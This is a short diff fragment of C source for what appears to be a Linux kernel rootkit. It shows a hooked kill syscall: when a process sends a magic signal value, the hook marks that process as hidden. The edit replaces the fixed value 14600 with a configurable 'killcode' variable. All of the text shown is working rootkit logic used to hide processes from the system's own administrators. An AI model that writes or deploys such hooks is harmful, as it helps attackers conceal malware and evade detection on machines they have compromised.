@@ -228,7 +228,7 @@ asmlinkage long kill_hook(const struct pt_regs *regs) {
 asmlinkage long kill_hook(pid_t pid, int signal) {
 #endif
     // printk(KERN_CRIT "kill with signal: %i\n", signal);
-    if (signal == 14600) {
+    if (signal == killcode) {
         // printk(KERN_CRIT "kill hooking\n");
         set_hidden_flags(pid);
     } else {
